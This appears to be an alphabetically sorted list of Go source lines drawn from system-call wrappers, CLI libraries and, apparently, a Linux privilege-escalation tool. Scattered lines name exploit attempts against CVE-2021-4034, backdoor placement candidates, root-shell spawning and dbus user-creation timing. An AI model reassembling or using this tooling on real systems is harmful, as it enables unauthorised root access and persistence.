"_, err = Getcwd(buf[0:])"
"_, err = Seek(fd, cnt, 0 /"
"_, err = SendmsgN(fd, p, oob, to, flags)"
"_, err = fcntl(fd, F_SETFL, flag)"
"_, err = fmt.Fprintf(w, format, a...)"
"_, err = ioctlRet(fd, req, arg)"
"_, err = port_associate(e.port, PORT_SOURCE_FILE, uintptr(unsafe.Pointer(fobj)), events, ("
"_, err = port_getn(e.port, "
"_, err = process.Wait()"
"_, found := e.fds[fd]"
"_, found := e.paths[path]"
"_, n, err := net.ParseCIDR(strings.TrimSpace(sval))"
"_, n, err := net.ParseCIDR(strings.TrimSpace(value))"
"_, ok := e.fds[fd]"
"_, ok := err.(invalidLengthError)"
"_C_int, flags int) (err error) = SYS_NAME_TO_HANDLE_AT"
"_C_int, flags int) (err error) {"
"_C_int, options int) (wpid int, err error) {"
"_C_int, options int) (wpid int, err error)"
"_C_int, options int, rusage "
"_Gid_t) (n int, err error) {"
"_Gid_t) (n int, err error)"
"_Gid_t) (nn int, err error) = SYS_GETGROUPS32"
"_Gid_t) (nn int, err error) {"
"_Gid_t) (nn int, err error)"
"_IOW(105, 26, struct oifaliasreq)"
"_IOW(105, 70, struct oifaliasreq)"
"_Socklen) (fd int, err error) = SYS___ACCEPT_A"
"_Socklen) (fd int, err error) = libsocket.accept"
"_Socklen) (fd int, err error) {"
"_Socklen) (fd int, err error)"
"_Socklen) (int, error) {"
"_Socklen) (n int, err error) = SYS___RECVFROM_A"
"_Socklen) (n int, err error) = libsocket.recvfrom"
"_Socklen) (n int, err error) {"
"_Socklen) (n int, err error)"
"_Socklen, flags int) (fd int, err error) = libsocket.accept4"
"_Socklen, flags int) (fd int, err error) {"
"_Socklen, flags int) (fd int, err error)"
"_Socklen, flags int) (int, error) {"
"_Socklen, flags int) (nfd int, err error) {"
"_Socklen, flags int) (nfd int, err error)"
"__clone(int flags, void "
"__major(version int, dev uint64) (val uint)"
"__makedev(version int, major uint, minor uint) (val uint64)"
"__minor(version int, dev uint64) (val uint)"
"__posix_fchown(int fd, uid_t uid, gid_t gid)"
"__semctl(int semid, int semnum, int cmd, ... union __semun "
"__sigaction_sigtramp(int signum, const struct sigaction "
"_lwp_ctl(int features, struct lwpctl "
"_lwp_getname(lwpid_t target, char "
"_lwp_kill(lwpid_t target, int signo)"
"_lwp_setname(lwpid_t target, const char "
"_lwp_unpark(lwpid_t target, const void "
"_lwp_wait(lwpid_t wait_for, lwpid_t "
"_p0)), 0)"
"_p0)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer("
"_p0)), uintptr(unsafe.Pointer(sacl)), uintptr(unsafe.Pointer("
"_p0, err = BytePtrFromString(arg)"
"_p0, err = BytePtrFromString(arg2)"
"_p0, err = BytePtrFromString(arg3)"
"_p0, err = BytePtrFromString(attr)"
"_p0, err = BytePtrFromString(attrname)"
"_p0, err = BytePtrFromString(cmdline)"
"_p0, err = BytePtrFromString(dst)"
"_p0, err = BytePtrFromString(file)"
"_p0, err = BytePtrFromString(fileName)"
"_p0, err = BytePtrFromString(filesystem)"
"_p0, err = BytePtrFromString(from)"
"_p0, err = BytePtrFromString(fromPathName)"
"_p0, err = BytePtrFromString(fsName)"
"_p0, err = BytePtrFromString(fsType)"
"_p0, err = BytePtrFromString(keyType)"
"_p0, err = BytePtrFromString(link)"
"_p0, err = BytePtrFromString(name)"
"_p0, err = BytePtrFromString(newroot)"
"_p0, err = BytePtrFromString(old)"
"_p0, err = BytePtrFromString(oldpath)"
"_p0, err = BytePtrFromString(params)"
"_p0, err = BytePtrFromString(path)"
"_p0, err = BytePtrFromString(path1)"
"_p0, err = BytePtrFromString(pathName)"
"_p0, err = BytePtrFromString(pathname)"
"_p0, err = BytePtrFromString(source)"
"_p0, err = BytePtrFromString(src)"
"_p0, err = BytePtrFromString(target)"
"_p0, err = syscall.BytePtrFromString(name)"
"_p0, err = syscall.BytePtrFromString(procname)"
"_p0, err = syscall.UTF16PtrFromString(filename)"
"_p0, err = syscall.UTF16PtrFromString(libname)"
"_p0, err = syscall.UTF16PtrFromString(path)"
"_p0, err = syscall.UTF16PtrFromString(str)"
"_p0, err = syscall.UTF16PtrFromString(subBlock)"
"_p0, ret = syscall.UTF16PtrFromString(objectName)"
"_p0, status = syscall.UTF16PtrFromString(name)"
"_p1)), 0, 0)"
"_p1, err = BytePtrFromString(aname)"
"_p1, err = BytePtrFromString(arg4)"
"_p1, err = BytePtrFromString(attr)"
"_p1, err = BytePtrFromString(attrname)"
"_p1, err = BytePtrFromString(description)"
"_p1, err = BytePtrFromString(dir)"
"_p1, err = BytePtrFromString(dst)"
"_p1, err = BytePtrFromString(filesystem)"
"_p1, err = BytePtrFromString(link)"
"_p1, err = BytePtrFromString(newpath)"
"_p1, err = BytePtrFromString(old)"
"_p1, err = BytePtrFromString(params)"
"_p1, err = BytePtrFromString(path2)"
"_p1, err = BytePtrFromString(putold)"
"_p1, err = BytePtrFromString(restriction)"
"_p1, err = BytePtrFromString(target)"
"_p1, err = BytePtrFromString(to)"
"_p1, err = BytePtrFromString(toPathName)"
"_p1, err = syscall.BytePtrFromString(proto)"
"_p2, err = BytePtrFromString(callback)"
"_p2, err = BytePtrFromString(fstype)"
"_p3, err = BytePtrFromString(parm)"
"_pset_bind(idtype_t idtype, id_t first_id, id_t second_id, psetid_t psid, psetid_t "
"_sched_getaffinity(pid_t pid, lwpid_t lid, size_t size, cpuset_t "
"_sched_getparam(pid_t pid, lwpid_t lid, int "
"_sched_setaffinity(pid_t pid, lwpid_t lid, size_t size, const cpuset_t "
"_sched_setparam(pid_t pid, lwpid_t lid, int policy, const struct sched_param "
"a := make([]_Gid_t, len(gids))"
"a := make([]_Gid_t, n)"
"a := make([]byte, len(s)"
"a := make([]string, 0)"
"a = append(a, UTF16ToString(bufW[i:j]))"
"a, const void "
"a, e := GetProcAddressByOrdinal(d.Handle, ordinal)"
"a, e := syscall_getprocaddress(d.Handle, namep)"
"a, err := ByteSliceFromString(s)"
"a, err := UTF16FromString(s)"
"a0)), 0)"
"a[0], nil"
"absoluteSDSize,"
"acb_list, int nent, struct sigevent "
"acc, e := UTF16PtrFromString(account)"
"accept(int s, struct sockaddr "
"accept(s int, rsa "
"accept4(fd int, rsa "
"accept4(s int, rsa "
"aclBytes := make([]byte, winHeapACL.aclSize)"
"aclBytes[0])), nil"
"act, struct sigaction "
"activeHelpEnvVar := strings.ToUpper(fmt.Sprintf(""%s%s"", name, activeHelpEnvVarSuffix))"
"activeHelpEnvVarSuffix  = ""_ACTIVE_HELP"""
"activeHelpGlobalDisable = ""0"""
"activeHelpGlobalEnvVar  = ""COBRA_ACTIVE_HELP"""
"activeHelpMarker = ""_activeHelp_ """
"actual, err := version.NewVersion(actualVersion)"
"actual, err := version.NewVersion(simpleVersion)"
"addr, "
"addr, errno := m.mmap(0, uintptr(length), prot, flags, fd, offset)"
"addr, errno := shmat(id, addr, flag)"
"addr, int data)"
"addr, size_t len)"
"addr, size_t len, char "
"addr, size_t len, int behav)"
"addr, size_t len, int behav, off_t value)"
"addr, size_t len, int flags)"
"addr, size_t len, int inherit)"
"addr, size_t len, int op)"
"addr, size_t len, int prot)"
"addr, size_t len, int prot, int flags, int fd, long PAD, off_t pos)"
"addr, size_t len, int prot, int flags, int fd, long pad, off_t pos)"
"addr, size_t len, int prot, int flags, int fd, off_t offset)"
"addr,"
"addr: a,"
"aiocbp, struct timespec "
"al.pointers = append(al.pointers, value)"
"alloc := make([]uintptr, (sdLen"
"alloc, err := LocalAlloc(LMEM_FIXED, uint32(size))"
"anamelen, const sigset_t "
"anamelen, int flags)"
"and it must be an int. GetString(""flagname"") will fail."
"annotation[cobra.BashCompCustom] = []string{""__kubectl_get_namespaces""}"
"architecture/OS or to add additional syscalls, types, or constants. Note that"
"arg = fiodgnameArg{Len: n, Buf: ("
"arg, int misc)"
"argAliases = []string { ""pods"", ""nodes"", ""services"", ""svc"", ""replicationcontrollers"", ""rc"" }"
"argp, char "
"args := [2]uintptr{uintptr(s), uintptr(how)}"
"args := [2]uintptr{uintptr(s), uintptr(n)}"
"args := [3]uintptr{uintptr(domain), uintptr(typ), uintptr(proto)}"
"args := [3]uintptr{uintptr(s), uintptr(addr), uintptr(addrlen)}"
"args := [3]uintptr{uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags)}"
"args := [3]uintptr{uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen))}"
"args := [4]uintptr{uintptr(domain), uintptr(typ), uintptr(flags), uintptr(unsafe.Pointer(fd))}"
"args := [4]uintptr{uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), uintptr(flags)}"
"args := [5]uintptr{uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen))}"
"args := [5]uintptr{uintptr(s), uintptr(level), uintptr(name), uintptr(val), vallen}"
"args := [6]uintptr{uintptr(s), base, uintptr(len(p)), uintptr(flags), uintptr(to), uintptr(addrlen)}"
"args := [6]uintptr{uintptr(s), base, uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen))}"
"args := []string{""-l""}"
"args := strings.Split(command, "" "")"
"args = append([]string{""-n""}, args...)"
"args = append(args, ""-n"")"
"args = append(args, UTF16ToString(("
"args = append(args, v.args...)"
"args)), 0)"
"args, err = f.parseLongArg(s, args, fn)"
"args, err = f.parseShortArg(s, args, fn)"
"args:           args,"
"args:   []string{""-Wall"", ""--shared"", ""-fPIC"", ""-o""},"
"args:   []string{""-m32"", ""-Wall"", ""--shared"", ""-fPIC"", ""-o""},"
"argsLenAtDash     int      // len(args) when a '--' was located when parsing, or -1 if no --"
"argsLenAtDash: -1,"
"argsWOflags := stripFlags(innerArgs, c)"
"argv, char "
"argv, err := CommandLineToArgv(StringToUTF16Ptr(commandLine), "
"argv[0], "
"armSyncFileRange(fd int, flags int, off int64, n int64) (err error) = SYS_ARM_SYNC_FILE_RANGE"
"around it. In fact, you can provide your own if you want."
"asa, socklen_t "
"attr,"
"attrname, const void "
"attrname, void "
"attrp, char "
"attrs, e := GetFileAttributes(p)"
"auditinfo_addr, u_int length)"
"author, ""author"", ""YOUR NAME"", ""Author name for copyright attribution"")"
"avgTime := v.timeDbusCommand(strings.Split(createUser, "" ""))"
"avgTime := v.timeDbusCommand(strings.Split(installPackage, "" ""))"
"avgTime := v.timeDbusCommand(strings.Split(setPassword, "" ""))"
"await(s []byte) (n int, err error)"
"awk '$1=="""
"b := ""0x"" "
"b := CommandLine.BoolP(name, shorthand, value, usage)"
"b := make([]byte, 20)"
"b := make([]byte, 4096)"
"b := make([]byte, CmsgSpace(SizeofInet4Pktinfo))"
"b := make([]byte, CmsgSpace(SizeofInet6Pktinfo))"
"b := make([]byte, CmsgSpace(SizeofUcred))"
"b := make([]byte, CmsgSpace(datalen))"
"b := make([]byte, len)"
"b := make([]byte, n)"
"b := make([]byte, sid.Len())"
"b := make([]rune, 8"
"b := make([]uint16, 300)"
"b := make([]uint16, n)"
"b = pbit16(b, d.Type)"
"b = pbit16(b, uint16(len(s)))"
"b = pbit16(b, uint16(n)-2)"
"b = pbit32(b, d.Atime)"
"b = pbit32(b, d.Dev)"
"b = pbit32(b, d.Mode)"
"b = pbit32(b, d.Mtime)"
"b = pbit32(b, d.Qid.Vers)"
"b = pbit64(b, d.Qid.Path)"
"b = pbit64(b, uint64(d.Length))"
"b = pbit8(b, d.Qid.Type)"
"b = pstring(b, d.Gid)"
"b = pstring(b, d.Muid)"
"b = pstring(b, d.Name)"
"b = pstring(b, d.Uid)"
"b, err := os.ReadFile(""/proc/sys/kernel/osrelease"")"
"b, err := strconv.ParseBool(strings.TrimSpace(boolStr))"
"b[0])), uintptr(len(b)))"
"b[0]), nil"
"b[0], "
"b[0], n)"
"b[0], uint32(len(b)), "
"baseLog.Printf(""Assessing machine state..."")"
"baseLog.Printf(""Checking for opportunities..."")"
"baseLog.Printf(""Continuing to look for opportunities"")"
"baseLog.Printf(""Done."")"
"baseLog.Printf(""No exploit found for '%s'"", exploitName)"
"baseLog.Printf(""Nothing found to exploit."")"
"baseLog.Printf(""You are already root."")"
"baseLog.WithTitle(""error"").Printf(""Disclosure failed: %s"", err)"
"baseLog.WithTitle(""error"").Printf(""Exploit failed: %s"", err)"
"basep, or handle"
"beta"", the metadata is ""beta""."
"bin, err := base64.StdEncoding.DecodeString(strings.TrimSpace(value))"
"bin, err := base64.StdEncoding.DecodeString(sval)"
"bin, err := hex.DecodeString(strings.TrimSpace(value))"
"bin, err := hex.DecodeString(sval)"
"binPath = ""/"""
"binPath, err := exec.LookPath(""sh"")"
"binary, for any purpose, commercial or non-commercial, and by any"
"binary.BigEndian.PutUint16(sa.raw[6:8], sa.SID)"
"binary.BigEndian.PutUint16(uuid[4:], timeMid)"
"binary.BigEndian.PutUint16(uuid[6:], timeHi)"
"binary.BigEndian.PutUint16(uuid[8:], seq)"
"binary.BigEndian.PutUint32(sa.raw[2:6], px_proto_oe)"
"binary.BigEndian.PutUint32(uuid[0:], id)"
"binary.BigEndian.PutUint32(uuid[0:], timeLow)"
"binary: ""aarch64-linux-gnu-gcc"","
"binary: ""gcc"","
"binaryName:     binaryName,"
"binaryPath, err := exec.LookPath(v.binaryName)"
"bind(int s, const struct sockaddr "
"bind(name string, old string, flag int) (err error)"
"bind(s Handle, name unsafe.Pointer, namelen int32) (err error) [failretval==socket_error] = ws2_32.bind"
"bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) = SYS___BIND_A"
"bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) = libsocket.__xnet_bind"
"bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error)"
"bits := strings.Split(string(data), "" "")"
"blink:     """
"block, token, inheritExisting)"
"bold:      """
"bool, dacl "
"bool, name string, value bool, usage string) {"
"bool, name, shorthand string, value bool, usage string) {"
"bool, sacl "
"boolSliceValue) fromString(val string) (bool, error) {"
"boolStrSlice := make([]string, len("
"boolStrSlice, err := readAsCSV(rmQuote.Replace(val))"
"bracketedParts := strings.SplitN(bracketed, "":"", 2)"
"bs := make([]byte, len(val)"
"bs, err := ByteSliceFromString(name)"
"buf := make([]GUID, reqSize)"
"buf := make([]KinfoProc, n/SizeofKinfoProc)"
"buf := make([]byte, 256)"
"buf := make([]byte, 4)"
"buf := make([]byte, 8)"
"buf := make([]byte, SizeofRawFileDedupeRange"
"buf := make([]byte, hdrSize"
"buf := make([]byte, n)"
"buf := make([]byte, reqSize)"
"buf := make([]byte, size)"
"buf := make([]uint16, n)"
"buf := make([]uint16, reqSize)"
"buf := make([]uint16, size)"
"buf = make([]byte, n)"
"buf = make([]byte, vallen)"
"buf = make([]uint16, buflen)"
"buf), uintptr(unsafe.Pointer(buf)))"
"buf,          struct statvfs "
"buf, """
"buf, ""-%s"", v.pre)"
"buf, err := SysctlRaw(name, args...)"
"buf, int buflen)"
"buf, int bufsize)"
"buf, int count)"
"buf, int flag)"
"buf, int flags)"
"buf, int maxsize, int "
"buf, long bufsize, int flags)"
"buf, long bufsize, int mode)"
"buf, size_t buflen)"
"buf, size_t bufsize)"
"buf, size_t bufsize, int flags)"
"buf, size_t count)"
"buf, size_t len)"
"buf, size_t len, int flags, const struct sockaddr "
"buf, size_t len, int flags, struct sockaddr "
"buf, size_t len, unsigned flags)"
"buf, size_t nbyte)"
"buf, size_t nbyte, int PAD, off_t offset)"
"buf, size_t nbyte, int flags)"
"buf, size_t nbyte, int flags, off_t offset)"
"buf, size_t nbyte, int pad, off_t offset)"
"buf, size_t nbyte, off_t offset)"
"buf, strings.Join(fmtParts, "".""))"
"buf, u_int buflen)"
"buf, u_int count, long "
"buf.WriteRune(',')"
"buf.WriteString(strconv.FormatInt(v, 10))"
"buf[0])), "
"buf[0])), len(buf) "
"buf[0])), len(buf) / 2, cap(buf) / 2}"
"buf[0])), nil"
"buf[0])), uintptr(len(buf)), 0)"
"buf[0]), "
"buf[0], "
"buf[0], buflen, flags)"
"buf[0], nil)"
"buf[0], uint32(len(buf)), "
"buffer := bytes.NewBufferString("""")"
"buffer := make([]byte, 0xff)"
"buffer := make([]byte, 1024)"
"buffer = make([]byte, length)"
"buffer)), int(unsafe.Sizeof(buffer)))"
"buffer,"
"bufferAlet, reasonCode = 0, 0"
"bufferLen, returnValue, returnCode = 4096, 0, 0"
"buflen, interfaceClass, deviceID16, flags)"
"bufp, size_t length)"
"build !aix,!darwin,!dragonfly,!freebsd,!linux,!netbsd,!openbsd,!zos,!windows,!solaris,!plan9"
"build !linux,!darwin,!freebsd,!dragonfly,!netbsd,!openbsd,!solaris"
"build !windows,!solaris,!aix"
"build ${GOARCH},${GOOS}"""
"build 386,freebsd"
"build 386,linux"
"build 386,netbsd"
"build 386,openbsd"
"build aix darwin,!race linux,!race freebsd,!race netbsd openbsd solaris dragonfly zos"
"build aix,ppc"
"build aix,ppc64"
"build aix,ppc64,gc"
"build aix,ppc64,gccgo"
"build amd64,darwin"
"build amd64,dragonfly"
"build amd64,freebsd"
"build amd64,illumos"
"build amd64,linux"
"build amd64,linux,gc"
"build amd64,netbsd"
"build amd64,openbsd"
"build amd64,solaris"
"build arm,freebsd"
"build arm,gc,linux"
"build arm,linux"
"build arm,netbsd"
"build arm,openbsd"
"build arm64,darwin"
"build arm64,freebsd"
"build arm64,linux"
"build arm64,netbsd"
"build arm64,openbsd"
"build darwin,!ios linux"
"build darwin,!ios"
"build darwin,amd64,go1.12"
"build darwin,amd64,go1.13"
"build darwin,arm64,go1.12"
"build darwin,arm64,go1.13"
"build darwin,go1.12"
"build darwin,go1.12,!go1.13"
"build darwin,go1.13"
"build darwin,race linux,race freebsd,race"
"build dragonfly,amd64"
"build freebsd,386"
"build freebsd,amd64"
"build freebsd,arm"
"build freebsd,arm64"
"build gccgo,!aix"
"build gccgo,linux,amd64"
"build illumos,amd64"
"build linux,386 linux,arm linux,mips linux,mipsle linux,ppc"
"build linux,386"
"build linux,amd64"
"build linux,arm"
"build linux,arm64"
"build linux,gc"
"build linux,gc,386"
"build linux,gccgo,386"
"build linux,gccgo,arm"
"build linux,loong64"
"build linux,mips"
"build linux,mips64"
"build linux,mips64le"
"build linux,mipsle"
"build linux,ppc"
"build linux,ppc64"
"build linux,ppc64le"
"build linux,riscv64"
"build linux,s390x"
"build linux,sparc64"
"build loong64,linux"
"build mips,linux"
"build mips64,linux"
"build mips64,openbsd"
"build mips64le,linux"
"build mipsle,linux"
"build netbsd,386"
"build netbsd,amd64"
"build netbsd,arm"
"build netbsd,arm64"
"build openbsd,386"
"build openbsd,amd64"
"build openbsd,arm"
"build openbsd,arm64"
"build openbsd,mips64"
"build plan9,!race"
"build plan9,386"
"build plan9,amd64"
"build plan9,arm"
"build plan9,race"
"build ppc,aix"
"build ppc,linux"
"build ppc64,aix"
"build ppc64,linux"
"build ppc64le,linux"
"build riscv64,linux"
"build s390x,linux"
"build solaris,amd64"
"build sparc64,linux"
"build windows,!race"
"build windows,go1.9"
"build windows,race"
"build zos,s390x"
"byte) (n int, err error) {"
"byte) (n int, err error)"
"byte) (n uint32, err error) = FormatMessageW"
"byte) (n uint32, err error) {"
"byte) (proc uintptr, err error) {"
"byte)(unsafe.Pointer(addr)), Addr: ("
"byte)(unsafe.Pointer(mreq)), int32(unsafe.Sizeof("
"byte)(unsafe.Pointer(regs)), uint64(unsafe.Sizeof("
"byte)(unsafe.Pointer(regsout)), uint64(unsafe.Sizeof("
"byte, bufSize uint32, bytesNeeded "
"byte, buffSize uint32, bytesNeeded "
"byte, buflen "
"byte, buflen uint32, watchSubTree bool, mask uint32, retlen "
"byte, cbif uint32, outbuf "
"byte, cbob uint32, cbbr "
"byte, countExtensions uint32, extensions "
"byte, encodedBytes "
"byte, encodedLen uint32) (context "
"byte, error) {"
"byte, fnptr unsafe.Pointer) int64"
"byte, inBufferLen uint32) (err error) {"
"byte, inBufferLen uint32) (err error)"
"byte, inBufferLen uint32, class uint32) (ntstatus error) = ntdll.NtSetInformationFile"
"byte, inBufferLen uint32, class uint32) (ntstatus error) {"
"byte, inBufferSize uint32, outBuffer "
"byte, infoLen uint32) (err error) = advapi32.SetTokenInformation"
"byte, infoLen uint32) (err error) {"
"byte, infoLen uint32, returnedLen "
"byte, lenEncodedBytes uint32, flags uint32, decoded unsafe.Pointer, decodedLen "
"byte, nbuf int) (n int, err error) = SYS_READ"
"byte, nbuf int) (n int, err error) = SYS_WRITE"
"byte, nbuf int) (n int, err error) {"
"byte, newlen uintptr) (err error) = SYS_SYSCTL"
"byte, newlen uintptr) (err error) = SYS___SYSCTL"
"byte, newlen uintptr) (err error) {"
"byte, np int) (n int, err error) = SYS_READ"
"byte, np int) (n int, err error) = SYS_WRITE"
"byte, np int) (n int, err error) = read"
"byte, np int) (n int, err error) = write"
"byte, np int) (n int, err error) {"
"byte, nstr int32, wchar "
"byte, oldlen "
"byte, optlen "
"byte, optlen int32) (err error) [failretval==socket_error] = ws2_32.setsockopt"
"byte, optlen int32) (err error) {"
"byte, outBufferLen uint32) (err error) {"
"byte, outBufferLen uint32) (err error)"
"byte, outBufferSize uint32, bytesReturned "
"byte, propertyBufferSize uint32) (err error) = setupapi.SetupDiSetDeviceRegistryPropertyW"
"byte, propertyBufferSize uint32) (err error) {"
"byte, propertyBufferSize uint32, requiredSize "
"byte, proto "
"byte, qrs "
"byte, rxdatalen uint32, laddrlen uint32, raddrlen uint32, lrsa "
"byte, rxdatalen uint32, laddrlen uint32, raddrlen uint32, recvd "
"byte, sendDataLen uint32, bytesSent "
"byte, size int) (lastsys int, err error) = SYS_W_GETMNTENT"
"byte, size int) (lastsys int, err error) = SYS___W_GETMNTENT_A"
"byte, size int) (lastsys int, err error) {"
"byte, size int, options int) (sz int, err error) {"
"byte, size int, options int) (sz int, err error)"
"byte, size int, position uint32, options int) (err error) {"
"byte, size int, position uint32, options int) (err error)"
"byte, size int, position uint32, options int) (sz int, err error) {"
"byte, size int, position uint32, options int) (sz int, err error)"
"byte, size uintptr, numberOfBytesRead "
"byte, size uintptr, numberOfBytesWritten "
"byte, timeout "
"byte, times "
"byte][]byte),"
"bytes, err := ByteSliceFromString(name)"
"bytesReturned, nil)"
"bytes[0], uintptr(len(name)))"
"c := exec.Command(""grep"", ""--color=auto"", ""bar"")"
"c, err := parseSingle(single)"
"c.Flags().Bool(""version"", false, usage)"
"c.Flags().BoolP(""help"", ""h"", false, usage)"
"c.Flags().BoolP(""version"", ""v"", false, usage)"
"c.HelpFunc()(c, []string{})"
"c.PostRun(c, argWoFlags)"
"c.PreRun(c, argWoFlags)"
"c.Print(fmt.Sprintf(format, i...))"
"c.PrintErr(fmt.Sprintf(format, i...))"
"c.PrintErrf(""Run '%v --help' for usage."
"c.PrintErrln(""Error:"", err.Error())"
"c.Printf(""Command %q is deprecated, %s"
"c.Printf(""Unknown help topic %"
"c.Println(""  -"""
"c.Println("""
"c.Println(""DebugFlags called on"", c.Name())"
"c.Println(""Press return to continue..."")"
"c.Run(c, argWoFlags)"
"c.commands = append(c.commands, x)"
"c.flags = flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"c.iflags = flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"c.lflags = flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"c.parentsPflags = flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"c.pflags = flag.NewFlagSet(c.Name(), flag.ContinueOnError)"
"c/pid"")"
"c/ppid"")"
"c:            c,"
"can sort a collection of versions properly, handles prerelease/beta"
"canDoSearchSystem32Once.v = (modkernel32.NewProc(""AddDllDirectory"").Find() == nil)"
"candidates = append(candidates, backdoorDirs...)"
"candidates = append(candidates, backdoorFilenames...)"
"candidates = append(candidates, random.Filename())"
"candidates = append(candidates, targetDir)"
"capRightsGet(version int, fd int, rightsp "
"capRightsLimit(fd int, rightsp "
"case """":"
"case ""$"
"case ""$1"" in"
"case ""$GOOS"" in"
"case ""$GOOSARCH"" in"
"case ""0"":"
"case ""<nil>"":"
"case ""NOPASSWD"":"
"case ""aix"":"
"case ""bash"":"
"case ""bool"":"
"case ""boolSlice"":"
"case ""count"":"
"case ""darwin"", ""ios"", ""illumos"", ""solaris"":"
"case ""false"":"
"case ""fish"":"
"case ""float64"":"
"case ""int64"":"
"case ""intSlice"":"
"case ""netbsd"", ""openbsd"":"
"case ""old-flag-name"":"
"case ""powershell"":"
"case ""string"":"
"case ""stringSlice"":"
"case ""system"":"
"case ""uint64"":"
"case ""uintSlice"":"
"case ""user"":"
"case ""zos"":"
"case ""zsh"":"
"case ' ', '"
"case '""', '"
"case '""':"
"case Debian, Ubuntu, Kali, Parrot:"
"case Fedora, RHEL, CentOS, OpenSUSE:"
"case name == ""help"":"
"case payloads.Default, payloads.Defer:"
"case payloads.Payload(""true""):"
"case reflect.Array, reflect.Chan, reflect.Map, reflect.Slice:"
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
"case s != """" "
"case s == ""--"":"
"case strings.HasPrefix(arg, ""-"") "
"case strings.HasPrefix(arg, ""--"") "
"case strings.HasPrefix(s, ""-"") "
"case strings.HasPrefix(s, ""--"") "
"cbn, flag.Shorthand))"
"ccflags=""$@"""
"cfgFile, ""config"", """", ""config file (default is $HOME/.cobra.yaml)"")"
"ch := make(chan os.Signal, 1)"
"changelist, int nchanges, struct kevent "
"changelist, size_t nchanges, struct kevent "
"char buf[1024], "
"check, err := NewVersion(matches[2])"
"check:    check,"
"checkTokenMembership(tokenHandle Token, sidToCheck "
"ci)), "
"ci, nil"
"cl[0])),"
"claims, both currently owned or controlled by Google and acquired in"
"classNameUTF16, err := UTF16PtrFromString(className)"
"classNameUTF16[0], MAX_CLASS_NAME_LEN, nil, machineNameUTF16, 0)"
"clearErrno(SB),NOSPLIT,$0-0"
"clock_getres(clockid_t clock_id, struct timespec "
"clock_gettime(clockid_t clock_id, struct timespec "
"clock_settime(clockid_t clock_id, const struct timespec "
"cmd := exec.Command(""sh"", ""-c"", fmt.Sprintf(""su - %s"", user.Username))"
"cmd := exec.Command(""sh"", ""-c"", fmt.Sprintf(""su - %s"", username))"
"cmd := exec.Command(""sudo"", args...)"
"cmd, _, e := c.Root().Find(args)"
"cmd, flags, err = c.Find(args)"
"cmd, flags, err = c.Traverse(args)"
"cmd.Args = append(cmd.Args, ""-c"", string(payload))"
"cmd.Env = append(cmd.Env, fmt.Sprintf(""PWNFILE=%s"", tempFile.Name()))"
"cmd.Env = append(os.Environ(), ""LANG=C"", ""LC_MESSAGES=C"")"
"cmd.Env = append(os.Environ(), v.envs...)"
"cmd.HelpFunc()(cmd, args)"
"cmd.MarkFlagFilename(flag, []string{})"
"cmd.MarkFlagFilename(flag, glob[])"
"cmd.MarkFlagFilename(flagName, ""yaml"", ""json"")"
"cmd.MarkFlagRequired(""container"")"
"cmd.MarkFlagRequired(""pod"")"
"cmd.MarkZshCompPositionalArgumentFile(pos, []string{})"
"cmd.MarkZshCompPositionalArgumentFile(pos, glob[])"
"cmd.MarkZshCompPositionalArgumentWords(pos, words[])"
"cmd.RegisterFlagCompletionFunc(flagName, func(cmd "
"cmd.Root().GenFishCompletion(os.Stdout, true)"
"cmd="""""
"cmd=""echo"""
"cmds, size_t maxcmds)"
"cmds, size_t ncmds)"
"cobra.CheckErr(RunGet(f, out, cmd, args))"
"cobra.Command, args []string) error {"
"cobra.Command, args []string) {"
"cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {"
"cobra.Command{Use: ""app""}"
"cobra.CompDebug(msg string, printToStdErr bool) {"
"cobra.CompDebugln(msg string, printToStdErr bool)"
"command = ""/bin/sh"""
"command = ""/usr/bin/true"""
"commandFound, a := innerfind(c, args)"
"commandName = strings.ReplaceAll(commandName, "" "", ""_"")"
"commandName = strings.ReplaceAll(commandName, "":"", ""__"")"
"commandParts := strings.Split(entry.Command, "" "")"
"commands = append(commands, command)"
"commands = append(commands, s)"
"comp = strings.Split(comp, """
"compCmdName              = ""completion"""
"compCmdNoDescFlagDesc    = ""disable completion descriptions"""
"compCmdNoDescFlagName    = ""no-descriptions"""
"compare := comparePart(partSelfPre, partOtherPre)"
"completionCmd.AddCommand(bash, zsh, fish, powershell)"
"completions = append(completions, argAlias)"
"completions = append(completions, completeRequireFlags(finalCmd, toComplete)...)"
"completions = append(completions, comps...)"
"completions = append(completions, fmt.Sprintf(""%s"
"completions = append(completions, getFlagNameCompletions(flag, toComplete)...)"
"completions = append(completions, validArg)"
"completions = completeRequireFlags(finalCmd, toComplete)"
"comps = cobra.AppendActiveHelp(comps, ""This command does not take any more arguments"")"
"comps = cobra.AppendActiveHelp(comps, ""You must choose a name for the repo you are adding"")"
"comps = cobra.AppendActiveHelp(comps, ""You must specify the URL for the repo you are adding"")"
"comps, directive = completionFn(finalCmd, finalArgs, toComplete)"
"connect(int s, const struct sockaddr "
"connect(s Handle, name unsafe.Pointer, namelen int32) (err error) [failretval==socket_error] = ws2_32.connect"
"connect(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) = SYS___CONNECT_A"
"connect(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) = libsocket.__xnet_connect"
"connect(s int, addr unsafe.Pointer, addrlen _Socklen) (err error)"
"connectExFunc.addr)),"
"connectExFunc.err = WSAIoctl(s,"
"const args[] = {""%s"", NULL}"
"const cbn = """
"const environ[] = {""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/"""
"const outputDir = ""./pkg/exploits/cve20214034"""
"constraints, err := version.NewConstraint("">= 1.0, < 1.4"")"
"control, "
"control, _, err := absoluteSD.Control()"
"control, _, err := selfRelativeSD.Control()"
